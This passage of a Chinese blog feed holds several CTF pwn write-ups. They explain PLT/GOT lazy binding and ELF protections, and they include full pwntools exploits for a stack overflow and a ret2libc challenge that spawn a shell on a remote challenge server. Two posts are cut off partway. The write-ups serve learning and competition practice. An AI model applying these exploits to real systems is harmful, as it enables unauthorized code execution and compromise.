延迟绑定的实现原理</font><p>&nbsp;&nbsp;&nbsp;&nbsp;延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; bar@plt:</span><br><span class="line">&gt; jmp    *(bar@GOT)</span><br><span class="line">&gt; push   n</span><br><span class="line">&gt; push   moduleID</span><br><span class="line">&gt; jump   _dl_runtime_resolve</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。</p><font color="red">更多关于延迟绑定和动态链接的文章如下：</font><p><a href="https://blog.csdn.net/roger_ranger/article/details/78903976" target="_blank" rel="noopener">① Linux动态链接之二：优化加速之延迟绑定PLT</a></p><p><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">② 延迟绑定的实现</a></p></blockquote><h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a><font color="brown">二、解题思路</font></h3><h4 id="1-file-pwn2"><a href="#1-file-pwn2" class="headerlink" title="1.file pwn2"></a><font color="navy">1.file pwn2</font></h4><p><img src="/images/84-2.jpg" alt></p><blockquote><p>从上面得到的信息是：<code>pwn2 是一个 32 位 可执行的 ELF 文件，并且是动态连接的</code></p></blockquote><h3 id="2-check-pwn2"><a href="#2-check-pwn2" class="headerlink" title="2.check pwn2"></a><font color="navy">2.check pwn2</font></h3><p><img src="/images/84-3.jpg" alt></p><blockquote><p>从上面可以得到的信息是：</p><ul><li>开启了 NX，表示我们不能通过栈溢出来执行 shellcode</li><li>没有开启栈保护，我们可以利用栈溢出这个漏洞的（Stack:    No canary found）</li><li>我们对 GOT 表具有写的权限（RELRO:    Partial RELRO）</li></ul></blockquote><h4 id="3-IDA-反编译-pwn2"><a href="#3-IDA-反编译-pwn2" class="headerlink" title="3.IDA 反编译 pwn2"></a><font color="navy">3.IDA 反编译 pwn2</font></h4><blockquote><font color="red">① 查找漏洞</font><p>通过 IDA 对 pwn2 的处理后，我们可以在函数 <code>sub_80484EA()</code> 中看到可能出现的漏洞——<code>read() 函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt; <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>我们可以通过简单的计算：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p><p>所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示：</p><p><img src="/images/84-4.png" alt></p><font color="red">② 查找 system() 和 /bin/sh </font><p>通过在 IDA 里面查找，我们没有找到 system() 和 \\bin\\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p><p><center>ROPgadget --binary pwn2 --string 'system'</center><br>但是并没有找到该字符：</p><p><img src="/images/84-8.jpg" alt></p></blockquote><h3 id="4-解题思路"><a href="#4-解题思路" class="headerlink" title="4.解题思路"></a><font color="navy">4.解题思路</font></h3><blockquote><p>通过我们对文件 <code>pwn2</code> 进行分析后，我们没有发现 system() 和/bin/sh，那么我们该怎么得到这两个的地址呢？</p><font color="red">① 查看 pwn2 用到的库</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ldd pwn2</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p><img src="/images/84-4.jpg" alt></p><p>从上面的得到的信息可以看出，文件 <code>pwn2</code> 中用到的库有 <code>linux-gate.so.1</code> 、<code>libc.so.6</code>、<code>ld-linux.so.2</code>，下面我们来看看这三个库中有什么？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>linux-gate.so.1</code>：这个所谓的”linux-gate.so.1”的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>libc.so.6</code>：我们通过查看<code>libc.so.6</code>库，可以看到这个库包含了 <code>pwn2</code> 程序中出现的<code>puts()函数</code>，以及我们想找的 <code>system()</code>函数以及<code>/bin/sh</code></p><p><img src="/images/84-5.jpg" alt></p><p><img src="/images/84-6.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p><p><br>下面的是我们计算机中有的库：</p><p><img src="/images/84-7.jpg" alt></p><p><br><font color="red">② 获得 system 和 /bin/sh 的地址</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><h4 id="1-编写脚本"><a href="#1-编写脚本" class="headerlink" title="1.编写脚本"></a><font color="navy">1.编写脚本</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-执行脚本"><a href="#2-执行脚本" class="headerlink" title="2.执行脚本"></a><font color="navy">2.执行脚本</font></h4><p><img src="/images/84-10.jpg" alt></p><h4 id="3-查看当前目录下的文件夹"><a href="#3-查看当前目录下的文件夹" class="headerlink" title="3.查看当前目录下的文件夹"></a><font color="navy">3.查看当前目录下的文件夹</font></h4><p><img src="/images/84-11.jpg" alt></p><h4 id="4-获取-flag"><a href="#4-获取-flag" class="headerlink" title="4.获取 flag"></a><font color="navy">4.获取 flag</font></h4><p><img src="/images/84-12.jpg" alt></p><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="brown">四、参考文章</font></h3><ul><li><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">延迟绑定的实现</a></li><li><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>★</li><li><a href="https://www.zhihu.com/question/21249496" target="_blank" rel="noopener">Linux动态链接为什么要用PLT和GOT表？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-GOT-表、PLT-表和-libc-库的
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-bof（基础类型题目）</title>
    <link href="https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/24/2019.09.24（83）/</id>
    <published>2019-09-23T16:00:00.000Z</published>
    <updated>2019-11-06T14:13:33.116Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-内存中栈的结构"><a href="#1-内存中栈的结构" class="headerlink" title="1.内存中栈的结构"></a><font color="navy">1.内存中栈的结构</font></h4><p><img src="/images/83-1.jpg" alt></p><blockquote><p>正如上图所示，栈是由“由高地址向低地址”方向生长。</p></blockquote><h4 id="2-常见的漏洞类型"><a href="#2-常见的漏洞类型" class="headerlink" title="2.常见的漏洞类型"></a><font color="navy">2.常见的漏洞类型</font></h4><blockquote><p>常见的漏洞类型有如下几种：</p><font color="orage">**① 逻辑错误**</font><p><br><font color="orage"><strong>② 内存破坏</strong></font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;✦ <font color="red">栈溢出</font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;✦ 整数溢出</p><p>&nbsp;&nbsp;&nbsp;&nbsp;✦ 格式化字符串</p><p>&nbsp;&nbsp;&nbsp;&nbsp;✦ 堆溢出</p><p>&nbsp;&nbsp;&nbsp;&nbsp;✦ 释放后使用</p></blockquote><h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a><font color="brown">二、解题思路</font></h3><h4 id="1-寻找漏洞"><a href="#1-寻找漏洞" class="headerlink" title="1.寻找漏洞"></a><font color="navy">1.寻找漏洞</font></h4><blockquote><p>通过 IDA Pro 对文件进行逆向，通过对伪代码的分析，我们可以看到在函数 <code>sub_8048573</code> 中，有一个明显的漏洞——read（）函数。我们是如何知道该处是一个漏洞呢？</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的伪代码，我们可以得出：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;① 我们可以往 <code>buf</code> 缓存中读入 <code>0x100u</code> 长的数据；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;② 但是 <code>buf</code> 缓存离 <code>ebp</code> 的偏移只有 <code>0x1c</code> 长；</p><p>因为 <code>0x100u</code> &gt; <code>0x1c</code> ，意味者我们可以往 <code>buf</code> 中输入 256 大小的的数据，但是会产生一处的现象，出现我们输入的数据覆盖掉 ebp 以上的的数据。</p></blockquote><h4 id="2-构造-payload"><a href="#2-构造-payload" class="headerlink" title="2.构造 payload"></a><font color="navy">2.构造 payload</font></h4><blockquote><p>现在我来画个示意图，来帮助大家理解：</p></blockquote><p><img src="/images/83-2.png" alt></p><blockquote><p>从上图我们可以知道构造 payload 的思路：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;① 我们之所以要利用这个漏洞，是想要通过覆盖 <code>return address</code>  的内容，从而跳转到我们想要执行的函数上；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;② 我们首先要填充 <code>buf</code> 和 <code>ebp</code> 部分，也就是 0x1c + 4 = 32 byte</p><p>&nbsp;&nbsp;&nbsp;&nbsp;③ 我们想要获取 <code>shell</code> ，所以在 <code>return address</code> 那里，我们要让它返回的地址是 <code>system()</code> 函数的地址；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;④ 因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;⑤ 要想获得 <code>shell</code> ，我们就必须执行 <code>system（‘/bin/sh’）</code> 函数，所以下面我们还得填充 <code>system（）</code> 函数得参数地址；</p><p>经过上述的分析，我们可以得到下述的示意图：、</p></blockquote><p><img src="/images/83-3.png" alt></p><h3 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a><font color="brown">三、解题过程</font></h3><h4 id="1-构造-payload"><a href="#1-构造-payload" class="headerlink" title="1.构造 payload"></a><font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’ <em> 32 + p32(system_address) + ‘a’ </em> 4 + p32(bin/sh_address)</p><p><font color="red">注</font>：system_address 后面之所以还要加上一个 4 字节的填充，是因为在调用 system 函数后，再返回到我的返回地址(<code>‘a’ * 4</code>：充当的是虚拟的返回地址。我们只要控制在 4 个字节里就 ok！)。再填写我们需要压入栈中的参数 <code>/bin/sh</code> 。</p></blockquote><h4 id="2-查找-system-函数和-bin-sh-的地址"><a href="#2-查找-system-函数和-bin-sh-的地址" class="headerlink" title="2.查找 system 函数和 /bin/sh 的地址"></a><font color="navy">2.查找 system 函数和 /bin/sh 的地址</font></h4><blockquote><p>在 IDA 中，可以查到 <code>system</code>  和 <code>/bin/sh</code> 的地址，如下：</p><p>a<img src="/images/83-4.jpg" alt></p><p><img src="/images/83-5.jpg" alt></p></blockquote><h4 id="3-写-exp"><a href="#3-写-exp" class="headerlink" title="3.写 exp"></a><font color="navy">3.写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9990</span>)</span><br><span class="line">system_address = <span class="number">0x080483F0</span></span><br><span class="line">bin_sh_address = <span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + p32(system_address) + <span class="string">'b'</span>*<span class="number">4</span> + p32(bin_sh_address)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="4-运行脚本，得到-flag"><a href="#4-运行脚本，得到-flag" class="headerlink" title="4.运行脚本，得到 flag"></a><font color="navy">4.运行脚本，得到 flag</font></h4><p><img src="/images/83-6.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-内存中栈的结构&quot;&gt;&lt;a href=&quot;#1
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>bash 漏洞（pwnable-shellshock）</title>
    <link href="https://muzibing.github.io/2019/09/17/2019.09.17%EF%BC%8882%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/17/2019.09.17（82）/</id>
    <published>2019-09-16T16:00:00.000Z</published>
    <updated>2019-09-18T08:55:07.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 bash 的一种题型吧。</p></blockquote><h3 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a><font color="brown">二、基础知识</font></h3><h4 id="1-setresuid"><a href="#1-setresuid" class="headerlink" title="1.setresuid"></a><font color="navy">1.setresuid</font></h4><blockquote><p>setresuid() 被执行的条件有：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;① 当前进程的 euid 是 root</p><p>&nbsp;&nbsp;&nbsp;&nbsp;② 三个参数，每个等于原来某个 id 中的一个</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;pwn 是 CTF 比赛中重要的一种题型，但
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>GOT 表攻击实例（pwnbable.kr_passcode）</title>
    <link href="https://muzibing.github.io/2019/09/10/2019.09.10%EF%BC%8881%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/10/2019.09.10（81）/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2019-09-24T08:53:09.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：<font color="orage">入门难、精通更难、入神超难</font>，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 GOT 表的一种题型吧。</p></blockquote><h3 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a><font color="brown">二、基础知识</font></h3><h4 id="1-GOT-表"><a href="#1-GOT-表" class="headerlink" title="1.GOT 表"></a><font color="navy">1.GOT 表</font></h4><blockquote><p><strong>① 什么是 GOT 表？</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;每一个<font color="red"><strong>外部定义的符号</strong></font>在全局偏移表（<em>Global offset Table</em>）中有相应的条目，GOT位于ELF的<font color="red"><strong>数据段</strong></font>中，叫做GOT段。</p><p><strong>② GOT 表的作用是什么？</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（<code>rtld</code>）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用<code>rtld</code>。</p><p><strong>③ 怎么查看 GOT 表？</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;在 Linux 系统里，我们可以通过  <code>objdump</code> 命令来查看程序的 GOT 表，具体的指令如下：</p><center> objdump  -R  file_name</center></blockquote><h4 id="2-PLT-表"><a href="#2-PLT-表" class="headerlink" title="2.PLT 表"></a><font color="navy">2.PLT 表</font></h4><blockquote><p><strong>① 什么是 PLT 表？</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;过程连接表(<em>Procedure Linkage Table</em>)，一个PLT条目对应一个GOT条目。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;当 main() 函数开始，会请求 plt 中这个函数的对应 GOT 地址，如果第一次调用那么 GOT 会重定位到 plt，并向栈中压入一个偏移，程序的执行回到 _init() 函数，rtld得以调用就可以定位 printf 的符号地址，第二次运行程序再次调用这个函数时程序跳入 plt，对应的 GOT 入口点就是真实的函数入口地址。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;动态连接器并不会把动态库函数在编译的时候就包含到 ELF 文件中,仅仅是在这个 ELF 被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在 ELF 文件中的 GOT 中保留一个调用地址。</p><p><strong>② GOT 表和 PLT 表的关系图</strong></p><p><img src="/images/81-1.png" alt></p></blockquote><h4 id="3-scanf-的漏洞"><a href="#3-scanf-的漏洞" class="headerlink" title="3.scanf 的漏洞"></a><font color="navy">3.scanf 的漏洞</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;如果对 scanf 的利用不加 &amp; ，会很有可能出现漏洞，在这道题目中，我将讲述该函数的漏洞利用。</p></blockquote><h4 id="4-ELF-文件保护机制"><a href="#4-ELF-文件保护机制" class="headerlink" title="4.ELF 文件保护机制"></a><font color="navy">4.ELF 文件保护机制</font></h4><blockquote><font color="orage">**① NX(No-eXecute)** </font><p>&nbsp;&nbsp;&nbsp;&nbsp;NX 即 No-eXecute （不可执行）的意思，NX（DEP）的基本原理是<font color="red">将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</font></p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;工作原理如图：</p><p><img src="/images/81-2.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：</p><p><center>gcc -z execstack -o test test.c</center><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，开启NX保护</span></span><br><span class="line">&gt; gcc -z execstack -o test test.c<span class="comment">// 禁用NX保护</span></span><br><span class="line">&gt; gcc -z noexecstack -o test test.c <span class="comment">// 开启NX保护</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p><font color="orage">**② RELRO**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;relro 是一种用于加强对 binary 数据段的保护的技术。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为 ” <font color="red">Partial RELRO</font> ”，说明我们对GOT表具有写权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，是Partial RELRO</span></span><br><span class="line">&gt; gcc -z norelro -o test test.c <span class="comment">// 关闭，即No RELRO</span></span><br><span class="line">&gt; gcc -z lazy -o test test.c <span class="comment">// 部分开启，即Partial RELRO</span></span><br><span class="line">&gt; gcc -z now -o test test.c <span class="comment">// 全部开启，即</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><font color="orage">**③ CANNARY（栈保护）**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;这个选项<strong>表示栈保护功能有没有开启</strong>。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 